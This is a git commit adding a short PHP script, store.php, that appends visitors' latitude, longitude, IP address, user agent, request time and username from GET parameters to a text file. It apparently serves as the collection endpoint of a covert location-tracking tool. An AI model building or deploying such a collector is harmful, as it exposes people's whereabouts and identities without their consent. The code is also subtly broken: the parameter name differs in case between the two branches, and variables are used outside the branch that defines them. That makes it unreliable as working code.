c5e9f2a2100a6a8f9f1940b56c06815db600bc34
NKWETACHA TERENCE <78331614+ROOT-017@users.noreply.github.com>
2022-05-21 21:10:34 +0100

    store.php file added

---
+++ store.php
@@ -0,0 +1,20 @@
+<?php
+if($_GET["noName"]==0){
+$myfile = fopen("location.txt","a");
+$format="\n==================================================\n";
+$format2="\n==================================================\n";
+$txt ="lat: ". $_GET["lat"] ."\nlon: ". $_GET["lon"]."\nIP: ". $_SERVER["REMOTE_ADDR"]."\nUserAgent:". $_GET["uagent"]."\nrequestTime: ".$_GET["date"];
+$uname="\nUserName:".$_GET["uname"]."\n";
+fwrite($myfile,$format);
+fwrite($myfile, $txt);
+fclose($myfile);
+
+}
+elseif($_GET["noname"]==1){
+    $myfile = fopen("location.txt","a");
+    fwrite($myfile, $uname);
+    fwrite($myfile,$format2);
+    fclose($myfile);
+}
+
+?>
